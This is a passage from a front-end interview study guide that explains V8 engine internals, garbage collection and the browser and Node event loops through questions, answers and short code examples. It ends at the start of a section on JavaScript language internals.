c.z = 7;        // c now has a DIFFERENT shape (C3) — access sites see 2 shapes
delete a.x;     // deopts `a` into slow dictionary mode
```

Rules that follow: **initialize all properties in the constructor, in the same order**; don't add properties later or conditionally; avoid `delete`. Consistent shapes keep call sites **monomorphic**, which keeps inline caches hot.

### Q4. What is an inline cache, and what do monomorphic / polymorphic / megamorphic mean?

An **inline cache (IC)** is a small cache *at each property-access or call site* recording the hidden class(es) it has seen and the resolved offset/handler. Next time, if the object has the same shape, V8 skips the lookup entirely.

- **Monomorphic** — the site has only ever seen **1 shape**. Fastest; the IC is a direct hit.
- **Polymorphic** — **2 to ~4 shapes**. V8 keeps a small list and checks each; slower.
- **Megamorphic** — **many shapes**. V8 gives up caching and falls back to a generic (hash-table) lookup. Slowest.

```javascript
function getX(o) { return o.x; }   // this call site has one IC

getX({x: 1});           // monomorphic
getX({x: 1, y: 2});     // now polymorphic (different shape)
getX({a: 0, x: 1});     // more shapes → drifting toward megamorphic
```

The practical takeaway: write functions that receive **consistently-shaped objects**. This is why libraries and hot loops care so much about not passing "grab-bag" objects with varying keys through the same function.

### Q5. What is deoptimization, and what commonly triggers it?

TurboFan compiles a function under **assumptions** (this arg is a smi/small-integer, this object has shape X, this array is packed). If a later call violates an assumption, V8 **deoptimizes**: discards the optimized code, resumes in the interpreter, and may re-optimize later — but repeated deopt/reopt ("deopt loops") is a real perf sink.

Common triggers:
- **Type instability** — a function called with numbers then strings.
- **Changing object shape** after the fact (`obj.newProp = …`, `delete`).
- **Array kind transitions** — a packed integer array (`PACKED_SMI_ELEMENTS`) that gets a `double` or a hole (`arr[100] = x` leaving gaps → `HOLEY` kind) or a mixed type.
- **`try/catch`/`arguments`/`with`/`eval`** historically defeated optimization; most are fine now, but `arguments` leakage and `eval` still hurt.
- Reading `arguments` in odd ways, or using `arguments` alongside rest params.

You spot deopts in Chrome via `--trace-deopt` in Node, or by profiling and seeing a hot function that never stays "optimized."

### Q6. Explain the difference between the stack and the heap in JS.

The **call stack** is a fixed-size LIFO structure of **call frames** — each holds a function's local variables and return address. Primitive values (numbers, booleans, small strings inline) and references live here. It's fast (just move a pointer) and freed automatically when a function returns. Overflowing it — unbounded recursion — throws `RangeError: Maximum call stack size exceeded`.

The **heap** is a large, unstructured region where **objects, arrays, functions/closures** are allocated. Variables on the stack hold *references* (pointers) into the heap. The heap is managed by the **garbage collector**, and it's where memory leaks and out-of-memory crashes happen.

```javascript
function f() {
  const n = 42;            // n (primitive) → stack frame
  const o = { big: [] };   // o → reference on stack; {…} object → heap
}                          // frame popped; object eligible for GC if unreferenced
```

### Q7. How does garbage collection work in V8?

V8 uses a **generational, mark-and-sweep** collector built on the observation that **most objects die young** ("the generational hypothesis").

- The heap is split into a small **young generation (nursery)** and a large **old generation**.
- **Minor GC (Scavenge)** runs frequently on the young generation: it's a fast copying collector that moves surviving objects to a second space and eventually promotes long-lived survivors to the old generation. Cheap because most young objects are already dead.
- **Major GC (Mark-Compact)** runs on the whole heap infrequently: **mark** everything reachable from **roots** (the stack, global objects, handles), **sweep** the unreachable, and **compact** to reduce fragmentation.

To keep pauses short, V8 does much of this **incrementally, concurrently, and with parallel threads** (Orinoco), but some phases are still **stop-the-world**. Reachability is the whole game: an object survives GC if and only if there's a chain of references to it from a root.

### Q8. What keeps an object alive / what makes it eligible for garbage collection?

An object is **reachable** (kept alive) if there's any reference path from a **GC root** to it. Roots include the current call stack (locals in active frames), global variables, and live closures. When the last reference is gone, it becomes **unreachable** and eligible for collection.

```javascript
let a = { v: 1 };
let b = a;      // 2 references to the same object
a = null;       // still reachable via b — NOT collected
b = null;       // now unreachable → eligible for GC
```

Crucially, GC is about reachability, **not** whether you'll actually use the object again. A cache you never read, a closure holding a huge array, a detached DOM node referenced by a listener — all still *reachable*, all kept. This is exactly why "the language has a GC" does not prevent leaks.

### Q9. What is a memory leak in a GC language, and how do you find one?

A leak is memory that's **still reachable but will never be used again**, so GC can't reclaim it and the heap grows unbounded. Classic front-end sources:

- **Forgotten timers/intervals** — `setInterval` whose callback closes over big state and is never `clearInterval`'d.
- **Dangling event listeners** — `addEventListener` on `window`/`document` not removed when a component unmounts, keeping the handler (and its closure) alive.
- **Detached DOM nodes** — you removed a node from the tree but a JS variable or listener still references it, so the whole subtree stays in memory.
- **Growing caches / arrays** — an unbounded `Map`/array you push into forever.
- **Closures** capturing more than they need.

Find them in DevTools: **Memory → Heap snapshot** (take one, act, take another, compare "objects allocated between snapshots"), the **Allocation timeline**, and the **Performance monitor**'s JS heap graph — a sawtooth that keeps climbing after GC is the tell. `WeakMap`/`WeakRef` let you hold references that *don't* prevent collection.

### Q10. Why can `delete obj.prop` hurt performance?

`delete` doesn't just remove a value — it **changes the object's hidden class** and often forces V8 to abandon the fast shape-based representation and switch the object into **dictionary (hash-table) mode**, which is slower for every subsequent property access and defeats the inline caches at every site that touches it.

```javascript
// slow: mutates shape, may trigger dictionary mode
delete user.sessionToken;

// fast on hot objects: keep the shape, clear the value
user.sessionToken = null;
```

For objects you genuinely use as dynamic key-value stores, prefer a **`Map`** — it's built for insertion/deletion and doesn't carry hidden-class baggage. Reserve plain objects (and stable shapes) for record-like data.

### Q11. Why are packed arrays faster than "holey" arrays, and how do you keep arrays fast?

V8 tracks an **elements kind** for each array, from fast to slow: `PACKED_SMI` (dense small ints) → `PACKED_DOUBLE` → `PACKED_ELEMENTS` (objects) → and the `HOLEY_*` variants (arrays with gaps). Transitions only go one direction — toward slower — and never back.

```javascript
const a = [1, 2, 3];   // PACKED_SMI_ELEMENTS — fastest
a.push(4.5);           // → PACKED_DOUBLE
a.push('x');           // → PACKED_ELEMENTS
const b = [1, 2, 3];
b[100] = 4;            // creates holes → HOLEY_* (slower element access)
```

Guidelines: **don't pre-size with holes** (`new Array(n)` then sparse fill), don't create gaps, keep element **types uniform**, and don't `delete` array elements (leaves holes). Contiguous, single-type arrays let V8 use the tightest, fastest representation.

### Q12. How is this relevant to front-end performance — give a concrete example.

Take a scroll or `mousemove` handler that runs dozens of times a second. If it's monomorphic, stable-typed, and doesn't allocate, it stays optimized and cheap. If it builds a fresh object of varying shape each call, or deopts on a type change, or allocates garbage every frame, you get two problems: the handler itself is slow, **and** the per-frame allocations trigger frequent **minor GCs** whose stop-the-world pauses drop frames.

```javascript
// bad: allocates a new object every event → GC pressure + shape churn
el.addEventListener('mousemove', e => {
  const p = { x: e.clientX, y: e.clientY, t: performance.now() };
  update(p);
});

// better: reuse, avoid per-frame allocation, keep shapes stable
const p = { x: 0, y: 0, t: 0 };
el.addEventListener('mousemove', e => {
  p.x = e.clientX; p.y = e.clientY; p.t = e.timeStamp;
  update(p);
}, { passive: true });
```

This is why "just profile it" beats guessing: the DevTools Performance panel shows the GC sawtooth and the deopts directly. It ties straight into INP (see [[the-event-loop-async-js]]).

### Q13. What is a stack overflow, and how do you fix deep recursion?

A **stack overflow** happens when the call stack exceeds its fixed size — typically unbounded or too-deep recursion — throwing `RangeError: Maximum call stack size exceeded`. JS engines historically don't do **tail-call optimization** (the ES2015 spec included proper tail calls, but only JavaScriptCore/Safari shipped it), so a recursive call that "should" reuse the frame still grows the stack.

Fixes:
- **Rewrite as iteration** with an explicit stack/queue (works for tree/graph traversal).
- **Trampolining** — return thunks and loop over them instead of recursing.
- **Break work up** across event-loop tasks for very large workloads (also keeps the main thread responsive — see [[the-event-loop-async-js]]).

```javascript
// recursion → iteration with an explicit stack
function sumTree(root) {
  let total = 0, stack = [root];
  while (stack.length) {
    const n = stack.pop();
    total += n.value;
    for (const c of n.children) stack.push(c);
  }
  return total;
}
```

### Q14. Are V8, JavaScriptCore, and SpiderMonkey meaningfully different?

Conceptually they're the same **tiered-JIT + generational-GC** design; the details and tier names differ. Worth knowing so you don't over-index on Chrome:

| | Engine | Interpreter / baseline | Optimizing JIT |
|---|---|---|---|
| Chrome/Edge/Node | **V8** | Ignition, Sparkplug | TurboFan (+ Maglev mid-tier) |
| Safari/WebKit | **JavaScriptCore** | LLInt, Baseline | DFG → FTL |
| Firefox | **SpiderMonkey** | Interpreter, Baseline | IonMonkey / Warp |

All use hidden-class/shape + inline-cache tricks and generational GC. The performance *advice* (stable shapes, monomorphic sites, avoid per-frame allocation) is portable across all three. JSC uniquely ships proper tail calls; V8 uniquely exposes the richest tracing flags in Node.

### Q15. Why does a huge JavaScript bundle cost more than just download time?

Because the engine still has to **parse and compile** every byte you ship, on the main thread, before (and during) execution. Even with lazy parsing (V8 defers fully parsing functions until first call), a multi-megabyte bundle incurs real **parse + compile CPU**, especially painful on low-end mobile where that time can dwarf network time.

Consequences and mitigations:
- **Code-split** so a route only parses the JS it needs (dynamic `import()`).
- **Tree-shake** dead code so it's never parsed at all.
- Ship less: parse cost is roughly proportional to bytes of JS.
- Defer non-critical scripts so parsing doesn't block first interaction.

This is the engine-level reason "JS is the most expensive byte you can ship" — an image byte is cheap to decode off-thread; a JS byte must be parsed and compiled on the main thread. Feeds directly into loading performance and TTI/INP.

### Q16. What's the difference between the JS engine and the JS runtime?

The **engine** (V8, JSC, SpiderMonkey) is *just* the language: parser, interpreter, JIT, GC, and the built-in objects the spec defines (`Object`, `Array`, `Promise`, `Math`). It knows nothing about the DOM, `setTimeout`, `fetch`, or the event loop.

The **runtime** is the engine **plus the host environment's APIs and the event loop**. In the browser that host is the renderer process: it provides `window`, the DOM, timers, `fetch`, `requestAnimationFrame`, storage, and the task/microtask queues. In Node it's libuv + the Node APIs (`fs`, `http`, `process`).

```text
┌───────────────────── Browser runtime ─────────────────────┐
│  Web APIs: DOM, fetch, setTimeout, rAF, storage…           │
│  Event loop + task/microtask queues                        │
│  ┌────────────── V8 engine ──────────────┐                 │
│  │ parse → bytecode → JIT, heap, GC, stack│                │
│  └────────────────────────────────────────┘                │
└────────────────────────────────────────────────────────────┘
```

So "single-threaded" refers to the engine's one call stack; the *runtime* has extra threads (network, timers, compositor) that hand work back via queues — the subject of [[the-event-loop-async-js]].

## The Event Loop & Async JS

### Summary

**What this topic covers**

How single-threaded JavaScript does many things "at once" without threads you control — the concurrency model that governs every timer, promise, fetch, and animation frame in the browser. This is the most-asked front-end topic after "what's the DOM," because it explains both correctness ("in what order does this log?") and performance ("why did the page freeze?"). Four concern areas: (1) the **single-threaded model** — one call stack, one main thread that also does layout and paint; (2) the **queues** — the **macrotask** queue (timers, events, I/O) versus the **microtask** queue (promises, `queueMicrotask`, `MutationObserver`) and the rule that **microtasks fully drain between macrotasks**; (3) **rendering integration** — where **`requestAnimationFrame`** fits, when paint happens, and how blocking JS freezes the UI; and (4) **practical async** — `setTimeout(0)` vs `Promise.resolve().then`, ordering puzzles, `async/await` desugaring, and why long tasks wreck INP. The 16 questions run from "what is the event loop" to diagnosing jank. Cross-reference the **Concurrency** primer for the general model — here it's strictly the browser's version. Builds directly on the call stack from [[the-javascript-engine]].

**Mental model**

Picture the main thread as a single worker with a to-do list and a strict ritual. The worker can only do one thing at a time (one **call stack**). When the stack is empty, it runs the **event loop**: (1) take **one** macrotask off the task queue and run it to completion; (2) then **drain the entire microtask queue** — running microtasks, including any that other microtasks schedule, until it's empty; (3) if it's time to render, run **`requestAnimationFrame`** callbacks, then style/layout/paint; (4) go back for the next macrotask. The two load-bearing facts: **JS runs to completion** — a task is never interrupted mid-function, so nothing else (including rendering) happens until your function returns; and **microtasks jump the queue** — they all run before the next macrotask and before the next paint. That's why a promise chain resolves "before" a `setTimeout(0)` queued earlier, and why an infinite microtask loop can starve rendering entirely. Async doesn't mean parallel: the network/timer work happens off-thread, but your *callback* always waits its turn on the one main thread.

**Key terms**

- **Call stack** — the single stack of function frames; the event loop only proceeds when it's empty.
- **Event loop** — the algorithm that repeatedly pulls the next task, drains microtasks, and renders.
- **Macrotask (task)** — a unit of work from a task source: `setTimeout`/`setInterval` callbacks, DOM events, I/O, `postMessage`, `MessageChannel`. One runs per loop turn.
- **Microtask** — a higher-priority job: **Promise** reactions (`.then`/`catch`/`finally`, `await` continuations), `queueMicrotask`, `MutationObserver` callbacks. The **entire** queue drains after each macrotask.
- **`requestAnimationFrame` (rAF)** — a callback that runs *right before* the browser paints, ~60 times/sec; the correct place for visual updates.
- **Rendering steps** — style → layout → paint → composite, run by the browser between tasks when needed (see the rendering-path topic).
- **`requestIdleCallback`** — runs low-priority work during idle time between frames.
- **Starvation** — when a flood of microtasks (or a long task) prevents rendering or later tasks from running.
- **Long task** — main-thread work >50ms; the direct cause of poor **INP** and unresponsive UI.
- **`await`** — syntactic sugar that pauses an `async` function and schedules its continuation as a **microtask** when the awaited promise settles.
- **Task source / prioritization** — the spec allows the browser to pick which task queue to service (e.g. user input can be prioritized), but microtasks always drain first.

**Why interviewers ask this**

It's the single best predictor of whether someone can reason about async correctness *and* performance. Juniors can often recite "JS is single-threaded" but can't order a mixed `setTimeout`/`Promise`/`await` snippet, and they conflate "async" with "parallel." Seniors nail the ordering, explain *why* (microtask drain, run-to-completion), and immediately connect it to real problems: "this analytics loop is a long task, that's your INP regression," or "you're doing layout reads in a `mousemove` handler, that's why scroll janks." The ordering puzzle is a proxy for a deeper skill — building an accurate mental model of a system and executing it in your head. It also gates real bugs: race conditions in data fetching, `await` in loops serializing requests, state updates that batch unexpectedly. Get the event loop right and most async debugging becomes mechanical.

**Common confusions**

- "Async means multithreaded/parallel." — No. The async *work* may happen off-thread, but your JS callbacks all run on the one main thread, one at a time.
- "`setTimeout(fn, 0)` runs immediately / right now." — It queues a **macrotask** for *after* the current task and *after* all pending microtasks (and clamps to ~4ms when nested). A `Promise.resolve().then(fn)` queued later still runs first.
- "Microtasks and macrotasks are the same queue." — Different queues with different priority; **all** microtasks drain between macrotasks.
- "`await` blocks the thread." — It pauses only *that async function* and yields the thread; the continuation resumes later as a microtask.
- "Rendering happens whenever state changes." — The browser only gets a chance to render *between* tasks, after microtasks drain; a long synchronous task blocks paint entirely.
- "Promises run on a background thread." — The promise *executor* runs synchronously on the main thread; only the `.then` reactions are deferred as microtasks.

**What follows from this topic**

The call stack the loop watches is the one from [[the-javascript-engine]], and a stop-the-world GC pause is effectively an invisible long task. Blocking the main thread is the root cause behind the runtime web-performance topic (jank, dropped frames, INP) — the fix is often to offload to a **Web Worker** or slice work across tasks. `MutationObserver` and `IntersectionObserver` (Web APIs) schedule via this same machinery. The ordering discipline here underpins data-fetching patterns (parallel vs waterfall requests). And the microtask/macrotask split mirrors the general Concurrency primer's scheduling discussion — read that for the CPU-level model, this for the browser's.

### Q1. What is the event loop?

The **event loop** is the browser's mechanism for running JavaScript concurrently on a **single thread**. JS itself has no built-in concurrency — it's one call stack. The runtime (browser) provides Web APIs (timers, network, DOM events) that do work off the main thread and, when done, place a **callback** on a **queue**. The event loop is the simple algorithm that ties it together:

```text
while (true) {
  task = taskQueue.dequeue();   // take ONE macrotask
  run(task);                    // run it to completion (stack empties)
  drainMicrotasks();            // run ALL microtasks
  if (timeToRender) render();   // rAF, style, layout, paint
}
```

So JS never "waits" — it registers a callback and returns, freeing the stack; later, when the stack is empty, the loop runs the queued callback. The one-line answer: "It's what lets single-threaded JS handle async — it pulls queued callbacks and runs them one at a time whenever the call stack is empty."

### Q2. What's the difference between the macrotask queue and the microtask queue?

Two queues with different sources and — critically — different scheduling priority.

| | Macrotask (task) queue | Microtask queue |
|---|---|---|
| Sources | `setTimeout`/`setInterval`, DOM events, I/O, `postMessage`, `MessageChannel`, `setImmediate` (Node) | Promise reactions (`.then/.catch/.finally`, `await`), `queueMicrotask`, `MutationObserver` |
| How many run per loop turn | **One** | **All of them** (queue is drained) |
| When | Once per event-loop iteration | Immediately after the current task/microtask, before the next macrotask **and before rendering** |
| Can schedule more that run in the same turn? | No — new macrotasks wait for a future turn | Yes — microtasks queued during draining run in the same drain |

The load-bearing rule: **after each macrotask, the engine drains the entire microtask queue before doing anything else** (including the next macrotask and the next paint). That single rule explains almost every ordering puzzle.

### Q3. What does this log, and why?

```javascript
console.log('A');
setTimeout(() => console.log('B'), 0);
Promise.resolve().then(() => console.log('C'));
console.log('D');
```

Output: **A, D, C, B**.

- `'A'` — synchronous, runs now.
- `setTimeout(…0)` — queues `'B'` as a **macrotask**.
- `Promise.resolve().then` — queues `'C'` as a **microtask**.
- `'D'` — synchronous, runs now.
- The current task (the top-level script) finishes → the engine **drains microtasks** → `'C'`.
- Next loop turn takes the next **macrotask** → `'B'`.

The insight to voice: the top-level script is itself a macrotask; when it ends, all microtasks run before any `setTimeout` callback, no matter that the timer was scheduled first.

### Q4. Order this harder one with async/await.

```javascript
console.log('1');
setTimeout(() => console.log('2'), 0);
async function f() {
  console.log('3');
  await null;
  console.log('4');
}
f();
Promise.resolve().then(() => console.log('5'));
console.log('6');
```

Output: **1, 3, 6, 4, 5, 2**.

Walk-through: `'1'` sync. `setTimeout` → macrotask `'2'`. `f()` runs synchronously up to the `await`: logs `'3'`, then `await null` schedules the **continuation** (`'4'`) as a microtask and returns. `Promise…then` queues `'5'` as a microtask (after `'4'`, since it was queued after). `'6'` sync. Script ends → drain microtasks in order: `'4'`, then `'5'`. Next macrotask: `'2'`. The key teaching point: **`await` splits the function** — everything after it becomes a microtask continuation.

### Q5. Is `setTimeout(fn, 0)` actually zero milliseconds?

No. Two reasons it's never truly immediate:

1. It queues a **macrotask**, so `fn` can't run until the current task finishes *and* all pending microtasks drain — arbitrarily long if either is busy.
2. The HTML spec **clamps** nested timers to a minimum (~**4ms** after 5 levels of nesting), and browsers throttle timers in background tabs.

```javascript
setTimeout(() => console.log('later'), 0);
Promise.resolve().then(() => console.log('sooner')); // runs first
// heavy synchronous work here delays 'later' by however long it takes
for (let i = 0; i < 1e9; i++) {}
```

So `setTimeout(fn, 0)` means "run `fn` as a new task as soon as possible," not "run now." For "as soon as possible, before the next paint/task," you want a **microtask** (`queueMicrotask`/`Promise.resolve().then`). For "yield to the browser but sooner than a clamped timer," `MessageChannel`/`postMessage` gives a ~0ms macrotask without the 4ms clamp.

### Q6. `setTimeout(0)` vs `Promise.resolve().then()` vs `queueMicrotask` — when would you reach for each?

- **`Promise.resolve().then(fn)` / `queueMicrotask(fn)`** — schedule a **microtask**: runs after the current synchronous code but **before** the next render and next macrotask. Use to "run right after current code, before the browser does anything else" — e.g. batching state updates, deferring a callback without yielding to paint. Danger: a flood of them can **starve rendering**.
- **`setTimeout(fn, 0)`** — schedule a **macrotask**: yields to the browser (lets it render, process input) before running. Use to break up long work, or to run *after* a paint. Subject to the ~4ms clamp.
- **`MessageChannel` / `postMessage`** — a macrotask with **no clamp**; the standard trick for "yield to the event loop as fast as possible" (React's scheduler uses it).

Rule of thumb: microtask = "before paint, right now-ish"; macrotask = "after giving the browser a turn."

### Q7. Why does an infinite (or heavy) microtask loop freeze the page, but a chain of setTimeouts doesn't?

Because **the microtask queue must fully drain before rendering** — the browser never gets to paint until it's empty.

```javascript
// FREEZES: microtasks reschedule themselves, queue never empties → no paint, ever
function spin() { Promise.resolve().then(spin); }
spin();

// DOES NOT freeze: each setTimeout is a separate macrotask;
// the browser renders and handles input BETWEEN them
function tick() { setTimeout(tick, 0); }
tick();
```

With recursive microtasks the loop is stuck in the "drain microtasks" step forever, so style/layout/paint and input handling never run — the tab hangs. With `setTimeout`, each callback is one macrotask; the loop completes a turn, renders, processes events, then takes the next timer. This is the mechanical reason to prefer macrotasks (or a Worker) for chunking long work.

### Q8. Where does `requestAnimationFrame` run in the loop, and why use it for animation?

`requestAnimationFrame(cb)` runs `cb` **just before the browser paints**, once per frame (~16.6ms at 60fps), *after* microtasks and *before* style/layout/paint.

```text
task → drain microtasks → [rAF callbacks] → style → layout → paint → composite → next task
```

Why it's the right tool for visual updates:
- It's **synchronized with the display refresh**, so you update exactly once per frame — no wasted work, no tearing.
- It's **paused in background tabs**, saving CPU/battery (unlike `setInterval`).
- Because it runs right before paint, DOM writes you make are painted **this** frame with no extra reflow.

```javascript
function animate(now) {
  el.style.transform = `translateX(${x(now)}px)`; // one write per frame
  requestAnimationFrame(animate);
}
requestAnimationFrame(animate);
```

Using `setTimeout` for animation instead gives unsynchronized, jittery frames. For visual work, rAF; for CPU work off the critical path, `requestIdleCallback` or a Worker.

### Q9. Walk me through how rendering interleaves with JavaScript.

The browser can only render **between tasks**, after microtasks drain, and only when it decides a frame is due. One conceptual frame:

```text
┌── event loop turn ──────────────────────────────────────────┐
│ 1. run one macrotask (e.g. a click handler, a timer)         │
│ 2. drain ALL microtasks (promise reactions)                  │
│ 3. if a frame is due:                                         │
│      a. run requestAnimationFrame callbacks                   │
│      b. recalc style → layout → paint → composite             │
│      c. run IntersectionObserver, ResizeObserver callbacks    │
│ 4. if idle time remains: requestIdleCallback                  │
└──────────────────────────────────────────────────────────────┘
```

The consequence every senior internalizes: **your JavaScript and rendering share one thread and take turns.** If step 1 or 2 takes 200ms, the browser can't reach step 3 — the frame is dropped, the UI freezes, input feels laggy. "60fps" means the whole turn must fit in ~16.6ms. This is the bridge to the runtime-performance topic.

### Q10. What does "blocking the main thread" mean and why is it bad?

The main thread runs JS **and** style/layout/paint **and** input handling. A long **synchronous** task monopolizes it, so during that time: no rendering (frozen UI), no scroll/click response (dropped or delayed input), no animation.

```javascript
// blocks for ~ seconds: nothing paints, clicks queue up unresponsive
button.addEventListener('click', () => {
  const rows = [];
  for (let i = 0; i < 5e7; i++) rows.push(expensive(i)); // long task
  render(rows);
});
```

Because JS **runs to completion**, the browser can't interrupt this to paint or handle the next click. That's a **long task** (>50ms) and the direct cause of poor **INP**. Fixes: break the work into chunks across macrotasks (`setTimeout`/`MessageChannel`/`scheduler.yield()`), move CPU work to a **Web Worker** (no DOM, but frees the main thread), virtualize large lists, or debounce/throttle high-frequency handlers.

### Q11. Do promises run on a separate thread?

No. This is a common misconception. The **promise executor runs synchronously on the main thread**, and `.then/.catch/.finally` reactions are just **microtasks** scheduled on the same thread.

```javascript
console.log('start');
new Promise((resolve) => {
  console.log('executor');   // SYNC — runs immediately, main thread
  resolve();
}).then(() => console.log('then'));  // microtask — deferred
console.log('end');
// start, executor, end, then
```

What *can* be off-thread is the **underlying async operation** wrapped by the promise — e.g. `fetch` does network I/O on the browser's network thread, a timer counts down on a timer thread. But when it completes, the promise's reaction is queued as a microtask and runs on the main thread when the stack clears. Promises are a *scheduling* abstraction, not a *threading* one — that's what Web Workers are for.

### Q12. What's the bug here, and how do you fix it?

```javascript
async function loadAll(ids) {
  const results = [];
  for (const id of ids) {
    results.push(await fetch(`/api/items/${id}`).then(r => r.json()));
  }
  return results;
}
```

The bug is **accidental serialization**: `await` inside the loop waits for each request to *fully complete* before starting the next, so N requests take N round-trips in series — a classic **request waterfall**. For independent requests this is needlessly slow.

Fix: fire them in **parallel** and await together.

```javascript
async function loadAll(ids) {
  return Promise.all(
    ids.map(id => fetch(`/api/items/${id}`).then(r => r.json()))
  );
}
```

Now all requests start at once and you wait for the slowest, not the sum. Use `Promise.allSettled` if you want partial success, and add concurrency limiting (a pool) if N is huge to avoid hammering the server / hitting the ~6-connection HTTP/1.1 limit. Only keep the sequential `await`-in-loop when each request genuinely depends on the previous one's result.

### Q13. What's the difference between `queueMicrotask`, `Promise.resolve().then`, and `MutationObserver` for scheduling a microtask?

All three schedule a **microtask** (runs after current sync code, before next macrotask/paint), but differ in ergonomics and history:

- **`queueMicrotask(fn)`** — the purpose-built, explicit API. Cleanest; no promise allocation, errors surface as uncaught exceptions rather than rejections.
- **`Promise.resolve().then(fn)`** — the classic idiom; works everywhere, but allocates a promise and swallows thrown errors into rejections.
- **`MutationObserver`** — the *original* microtask hack (pre-`queueMicrotask`): observe a dummy DOM node and mutate it to trigger a microtask. Now obsolete for scheduling; use it for its real purpose — reacting to DOM changes.

```javascript
queueMicrotask(() => console.log('cleanest'));
Promise.resolve().then(() => console.log('classic'));
```

Prefer `queueMicrotask` when you just need "run at end of current microtask checkpoint." Reserve `MutationObserver` for actually observing DOM mutations.

### Q14. How would you break up a long task to keep the UI responsive?

Slice the work into chunks and **yield to the event loop** between them so the browser can render and handle input. The tradeoff: microtasks don't yield to paint (they drain first), so you need **macrotasks** or the modern scheduler API.

```javascript
// yield with MessageChannel (no 4ms clamp) — process in chunks
async function processInChunks(items, work) {
  const channel = new MessageChannel();
  const yieldToLoop = () =>
    new Promise(res => { channel.port1.onmessage = () => res(); channel.port2.postMessage(0); });

  for (let i = 0; i < items.length; i++) {
    work(items[i]);
    if (i % 100 === 0) await yieldToLoop(); // let the browser paint/respond
  }
}
```

Modern option: **`scheduler.yield()`** (and `scheduler.postTask` with priorities) is the standardized way to yield and resume with good priority. For pure CPU work with no DOM needs, prefer a **Web Worker** — it runs truly in parallel and never blocks the main thread at all. Yielding trades total throughput for responsiveness/INP; Workers give you both at the cost of message-passing complexity.

### Q15. How does the event loop connect to INP and Core Web Vitals?

**INP (Interaction to Next Paint)** measures the latency from a user interaction (click, tap, key) to the **next frame the browser paints** in response. The event loop is exactly the machinery that determines that latency:

1. The interaction queues an **input task** (macrotask).
2. It can't run until the current task finishes and microtasks drain.
3. Your event handler runs (its duration counts).
4. Microtasks from the handler drain.
5. Only *then* can the browser render the response frame.

So INP is hurt by: a **long task already running** when the input arrives (input waits), a **slow handler**, and **heavy microtask/rendering work** before paint. The fixes are all event-loop moves: eliminate long tasks (chunk or offload to a Worker), keep handlers light, defer non-urgent work with `setTimeout`/`scheduler.postTask`, and avoid synchronous layout in handlers. "Good INP" (≤200ms) essentially means "no long tasks between the click and the paint."

### Q16. Node's event loop vs the browser's — what's different?

Same core idea (single-threaded JS, off-thread I/O via a loop), different implementation and extra queues. Worth a sentence so you don't assume browser ordering in Node:

- **Browser**: HTML-spec event loop; one macrotask per turn, drain microtasks, then render (rAF/paint). Task sources are timers, DOM events, I/O.
- **Node**: libuv-based loop with **distinct phases** run in a fixed order — *timers* (`setTimeout`/`setInterval`), *pending callbacks*, *poll* (I/O), *check* (`setImmediate`), *close*. It adds **`process.nextTick`** (drains *before* the Promise microtask queue — even higher priority) and has no rendering step or rAF.

```javascript
// Node-specific ordering
setTimeout(() => console.log('timeout'), 0);
setImmediate(() => console.log('immediate'));
Promise.resolve().then(() => console.log('promise'));
process.nextTick(() => console.log('nextTick'));
// nextTick, promise, then timeout/immediate (order between those two varies)
```

The portable lesson: microtasks-before-macrotasks holds in both, but Node adds phases and `process.nextTick`, and there's no paint. See the Concurrency primer for the general scheduling model.

## JavaScript Language Internals

### Summary

**What this topic covers**

The language-semantics questions interviewers use to probe whether you actually understand JavaScript rather than pattern-matching syntax — the "what does this log and why" territory. Since there's no separate JS-language primer in this app, the front-end-critical internals live here. Five concern areas: (1) **closures** — how functions capture their lexical environment, the memory implications, and the classic loop-variable bug; (2) the **prototype chain** — `[[Prototype]]`, delegation, and how `class` desugars onto it; (3) **`this` binding** — the five rules (default, implicit, explicit, `new`, arrow) that decide what `this` is; (4) **execution semantics** — **hoisting**, the **TDZ**, lexical **scope**, and `var`/`let`/`const`; and (5) **coercion & modules** — `==` vs `===`, truthiness, and **ESM vs CommonJS**. The 16 questions are deliberately code-first: you'll be handed a snippet and asked to predict output and justify it. Get these right and you signal you can debug the weird stuff; get them wrong and every senior in the room notices. Closures also tie back to the memory model in [[the-javascript-engine]], and the loop-var bug intersects [[the-event-loop-async-js]].

**Mental model**

Two ideas unlock most of this topic. First, **scope is lexical (determined by where code is written), but `this` is dynamic (determined by how a function is called)** — conflating these two is the #1 source of confusion. A closure "remembers" the variables in the scope it was *defined* in, forever, regardless of where it's later called. But `this` inside a normal function is decided fresh at each **call site** by which of five rules applies. Second, **almost everything is an object with a hidden link to another object** — its prototype. When you read a property, the engine walks the `[[Prototype]]` chain until it finds it or hits `null`. `class` is sugar over this: methods live on the prototype, shared by all instances. Arrow functions are the pragmatic fix that collapses the `this` complexity: they have **no own `this`**, so they lexically inherit it like any other variable. Hold "lexical scope + prototype delegation + call-site `this`" in your head and the puzzles become mechanical.

**Key terms**

- **Closure** — a function bundled with a reference to its surrounding lexical environment; it keeps those variables alive as long as the function is reachable.
- **Lexical scope** — scope determined by the physical nesting of code, resolved at author time, not call time.
- **`[[Prototype]]`** — the internal link from an object to its prototype; exposed via `Object.getPrototypeOf` / `__proto__`; the basis of inheritance.
- **Prototype chain** — the sequence of `[[Prototype]]` links the engine walks on a property lookup, ending at `null`.
- **`this`** — a call-site-bound reference; its value depends on how the function is invoked (default/implicit/explicit/`new`/arrow).
- **Hoisting** — declarations are processed before execution: `var` and function declarations are "moved up" (function bodies fully; `var` initialized to `undefined`); `let`/`const`/`class` are hoisted but not initialized.
- **TDZ (Temporal Dead Zone)** — the span from entering a scope to a `let`/`const` declaration, during which accessing it throws `ReferenceError`.
- **Coercion** — implicit type conversion; `==` coerces, `===` doesn't; `+` prefers string concat, most other operators prefer numbers.
- **Truthy / falsy** — the 8 falsy values (`false`, `0`, `-0`, `0n`, `''`, `null`, `undefined`, `NaN`); everything else is truthy.
- **ESM** — ECMAScript Modules: `import`/`export`, **static** (analyzable → tree-shakeable), strict mode by default, live bindings, async loading.
- **CommonJS** — Node's `require`/`module.exports`: **dynamic**, synchronous, value copies, not tree-shakeable.
- **`var` / `let` / `const`** — function-scoped + hoisted-to-`undefined` vs block-scoped + TDZ vs block-scoped + no reassignment.

**Why interviewers ask this**

